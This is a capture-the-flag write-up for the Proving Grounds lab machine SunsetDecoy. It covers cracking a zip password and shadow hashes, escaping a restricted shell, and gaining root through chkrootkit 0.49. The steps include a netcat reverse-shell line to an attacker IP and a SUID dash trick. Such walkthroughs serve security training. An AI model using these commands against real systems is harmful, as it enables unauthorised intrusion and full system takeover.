---
title: "Proving grounds Play: SunsetDecoy"
layout: post
date: 2023-10-01 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)
|   256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)
|_  256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp - open  http - Apache httpd 2.4.38

![img](/assets/images/CTF/Proving_Grounds/SunsetDecoy/web.png)

Download the zip file http://192.168.240.85/save.zip.

Extract the zip file using `unzip`, unfortunately it is password protected.

## Crack the password

Crack the password of the zip file using `fcrackzip` tool.

```sh
naveenj@hackerspace:|22:50|~/pg-play/SunsetDecoy/files/fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip

PASSWORD FOUND!!!!: pw == manuel
```

Extract and list the extracted files.

```sh
-rw-r--r-- 1 naveenj naveenj 2018 Sep 30 22:52 crackme
-rw-r--r-- 1 naveenj naveenj  829 Jun 27  2020 group
-rw-r--r-- 1 naveenj naveenj   33 Jun 27  2020 hostname
-rw-r--r-- 1 naveenj naveenj  185 Jun 27  2020 hosts
-rw-r--r-- 1 naveenj naveenj 1807 Jun 27  2020 passwd
-rw-r----- 1 naveenj naveenj 1111 Jul  7  2020 shadow
-r--r----- 1 naveenj naveenj  669 Feb  2  2020 sudoers
```

Using `unshadow` to make it crackable for john.

```sh
naveenj@hackerspace:|22:52|~/pg-play/SunsetDecoy/files/etc$ unshadow passwd shadow > crackme
naveenj@hackerspace:|22:52|~/pg-play/SunsetDecoy/files/etc$ ls
crackme  group  hostname  hosts  passwd  shadow  sudoers
```

### Crack password using john

```sh
naveenj@hackerspace:|22:52|~/pg-play/SunsetDecoy/files/etc$ john crackme --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828) 
```

SSH to the attacking machine using cracked credentials. Use the command `-t "bash --noprofile"` to escape the restricted bash.

```sh
naveenj@hackerspace:|23:39|~/pg-play/SunsetDecoy/files/etc$ ssh 296640a3b825115a47b68fc44501c828@192.168.240.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.240.85's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
```

## Privilege Escalation

List the files in the attacking machine, the file `honeypot.decoy` is compiled and executable.

```sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -al
total 60
drwxr-xr-x 2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  4096 Sep 30 23:15 .
drwxr-xr-x 3 root                             root                              4096 Jun 27  2020 ..
lrwxrwxrwx 1 root                             root                                 9 Jul  7  2020 .bash_history -> /dev/null
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  3583 Jun 27  2020 .bashrc
-rwxr-xr-x 1 root                             root                             17480 Jul  7  2020 honeypot.decoy
-rw------- 1 root                             root                              1855 Jul  7  2020 honeypot.decoy.cpp
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 id -> /bin/id
lrwxrwxrwx 1 root                             root                                13 Jun 27  2020 ifconfig -> /bin/ifconfig
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    33 Sep 30 22:49 local.txt
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 ls -> /bin/ls
lrwxrwxrwx 1 root                             root                                10 Jun 27  2020 mkdir -> /bin/mkdir
-rwxr-xr-x 1 root                             root                               807 Jun 27  2020 .profile
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    66 Jun 27  2020 .selected_editor
-rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    32 Aug 27  2020 user.txt
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   165 Sep 30 23:17 .wget-hsts
```

Execute the file with the option 5.

```sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
```

The scan will be launched, and in order to know what is running we need to monitor the system process. Download [pspy](https://github.com/DominicBreuker/pspy) into the attacking machine and run it.

```sh
2023/09/30 23:46:05 CMD: UID=0     PID=16936  | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2023/09/30 23:46:05 CMD: UID=0     PID=16935  | /bin/bash /root/script.sh 
2023/09/30 23:46:05 CMD: UID=0     PID=16933  | /bin/sh -c /bin/bash /root/script.sh
2023/09/30 23:46:11 CMD: UID=1000  PID=834    | ./honeypot.decoy 
2023/09/30 23:46:11 CMD: UID=1000  PID=835    | sh -c /usr/bin/touch /dev/shm/STTY5246 
2023/09/30 23:47:01 CMD: UID=0     PID=837    | /usr/sbin/CRON -f 
2023/09/30 23:47:01 CMD: UID=0     PID=838    | /usr/sbin/CRON -f 
2023/09/30 23:47:01 CMD: UID=0     PID=839    | /bin/sh -c /bin/bash /root/script.sh 
2023/09/30 23:47:01 CMD: UID=0     PID=840    | /bin/bash /root/script.sh 
2023/09/30 23:47:01 CMD: UID=0     PID=843    | /bin/sh /root/chkrootkit-0.49/chkrootkit  
```

The process `chkrootkit-0.49` has been running as root, there is a local privilege escalation exploit exists in the exploitDB [Chkrootkit 0.49 - Local Privilege Escalation](https://www.exploit-db.com/exploits/33899).

Create a reverse shell using netcat and save it as `update` in the `/tmp` directory and make it executable `chmod +x update`.

```sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ cat update
/usr/bin/nc 192.168.45.225 4444 -e /bin/sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ 
```

Once the chkrootkit runs the exploit file `update` we will get the root shell.

```sh
naveenj@hackerspace:|23:29|~/pg-play/SunsetDecoy$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.240.85] 57632
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
```

**Root Obtained**

An alternative way to obtain root without using netcat is as follows:

Create a file named `update` in the `/tmp` directory and the contents should be as below.

```sh
#!/bin/bash

sudo cp /usr/bin/dash /tmp/dash; chmod u+s /tmp/dash;
```

Now run the `honeypot.decoy` binary and wait for few seconds.

List the file in the `/tmp` folder and list it's permissions.

```sh
drwxr-xr-x 18 root  root     4096 Jul 12  2020 ..
-rwsr-xr-x  1 root  root     121464 Sep 30 23:54 dash
```

Now run the binary `dash` as follows to obtain root.

```sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./dash -p
# whoami
root
# id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) euid=0(root) groups=1000(296640a3b825115a47b68fc44501c828)
# 
```

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).